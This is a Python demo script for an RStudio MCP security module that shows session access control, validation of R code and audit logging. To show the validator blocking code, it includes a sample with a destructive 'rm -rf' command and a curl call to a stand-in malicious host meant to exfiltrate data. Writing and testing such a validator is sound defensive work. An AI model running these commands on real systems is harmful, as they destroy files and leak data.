#!/usr/bin/env python3
"""Demonstration of RStudio MCP security features."""

import asyncio
import tempfile
import time
from pathlib import Path

from rstudio_mcp.security import (
    AccessController, CodeSecurityValidator, AuditLogger,
    ResourceType, Permission, SecurityLevel, AccessRule
)


async def main():
    """Demonstrate security features."""
    print("🔒 RStudio MCP Security System Demo")
    print("=" * 50)
    
    # Create temporary audit log
    with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.log') as f:
        audit_log_file = f.name
    
    try:
        # Initialize security components
        print("\n1. Initializing security components...")
        
        access_controller = AccessController()
        code_validator = CodeSecurityValidator()
        audit_logger = AuditLogger({
            'enabled': True,
            'log_file': audit_log_file,
            'flush_interval': 1.0
        })
        
        print("✅ Security components initialized")
        
        # Create a session
        print("\n2. Creating user session...")
        session_id = "demo-session-123"
        user_id = "demo-user"
        
        access_controller.create_session(session_id, user_id)
        print(f"✅ Session created: {session_id}")
        
        # Test code security validation
        print("\n3. Testing code security validation...")
        
        # Safe code
        safe_code = """
        # Safe R code
        data <- c(1, 2, 3, 4, 5)
        mean_value <- mean(data)
        plot(data, main="Sample Plot")
        print(paste("Mean:", mean_value))
        """
        
        print("🔍 Validating safe code...")
        safe_violations = code_validator.validate_code(safe_code)
        print(f"   Violations found: {len(safe_violations)}")
        
        if len(safe_violations) == 0:
            print("✅ Safe code passed validation")
            audit_logger.log_code_execution(
                session_id, user_id, safe_code, "validation_passed", 0.1
            )
        
        # Dangerous code
        dangerous_code = """
        # Dangerous R code
        system("rm -rf /tmp/*")
        shell("curl http://malicious-site.com/steal-data")
        eval(parse(text="malicious_code"))
        """
        
        print("\n🔍 Validating dangerous code...")
        dangerous_violations = code_validator.validate_code(dangerous_code)
        print(f"   Violations found: {len(dangerous_violations)}")
        
        for violation in dangerous_violations[:3]:  # Show first 3
            print(f"   ⚠️  {violation.level.value.upper()}: {violation.message}")
        
        if dangerous_violations:
            print("❌ Dangerous code blocked")
            audit_logger.log_security_violation(
                session_id, user_id, "blocked_function", "critical",
                f"Blocked dangerous code: {dangerous_violations[0].message}"
            )
        
        # Test access control
        print("\n4. Testing access control...")
        
        # Test allowed access
        print("🔍 Checking file read access to /tmp/...")
        can_read_tmp = access_controller.check_access(
            session_id, ResourceType.FILE, "/tmp/test.txt", Permission.READ
        )
        
        if can_read_tmp:
            print("✅ Access granted to /tmp/ files")
            audit_logger.log_access_granted(
                session_id, user_id, "file", "/tmp/test.txt", "read"
            )
        
        # Test denied access
        print("🔍 Checking write access to /etc/...")
        can_write_etc = access_controller.check_access(
            session_id, ResourceType.FILE, "/etc/passwd", Permission.WRITE
        )
        
        if not can_write_etc:
            print("❌ Access denied to /etc/ files")
            audit_logger.log_access_denied(
                session_id, user_id, "file", "/etc/passwd", "write",
                "System files are read-only"
            )
        
        # Add custom access rule
        print("\n5. Adding custom access rule...")
        custom_rule = AccessRule(
            resource_type=ResourceType.FILE,
            resource_pattern="/custom/project/*",
            permissions={Permission.READ, Permission.WRITE, Permission.CREATE},
            description="Custom project directory access"
        )
        
        access_controller.add_access_rule(custom_rule)
        
        can_access_custom = access_controller.check_access(
            session_id, ResourceType.FILE, "/custom/project/data.csv", Permission.WRITE
        )
        
        if can_access_custom:
            print("✅ Custom access rule working")
        
        # Generate security report
        print("\n6. Generating security report...")
        report = code_validator.get_security_report(dangerous_code)
        
        print(f"   Total violations: {report['total_violations']}")
        print(f"   Risk score: {report['risk_score']}/100")
        print(f"   Is safe: {report['is_safe']}")
        print("   Recommendations:")
        for rec in report['recommendations'][:2]:
            print(f"   • {rec}")
        
        # Wait for audit log flush
        print("\n7. Waiting for audit log flush...")
        await asyncio.sleep(2)
        
        # Show audit statistics
        stats = audit_logger.get_statistics()
        print(f"   Events logged: {stats['events_logged']}")
        print(f"   Queue size: {stats['queue_size']}")
        
        # Query recent audit events
        print("\n8. Recent audit events:")
        events = audit_logger.query_events(session_id=session_id, limit=5)
        
        for event in events:
            timestamp = time.strftime('%H:%M:%S', time.localtime(event['timestamp']))
            print(f"   [{timestamp}] {event['event_type']}: {event['message']}")
        
        print("\n🎉 Security demo completed successfully!")
        
    finally:
        # Cleanup
        if 'audit_logger' in locals():
            audit_logger.shutdown()
        
        # Remove temporary audit log
        Path(audit_log_file).unlink(missing_ok=True)


if __name__ == "__main__":
    asyncio.run(main())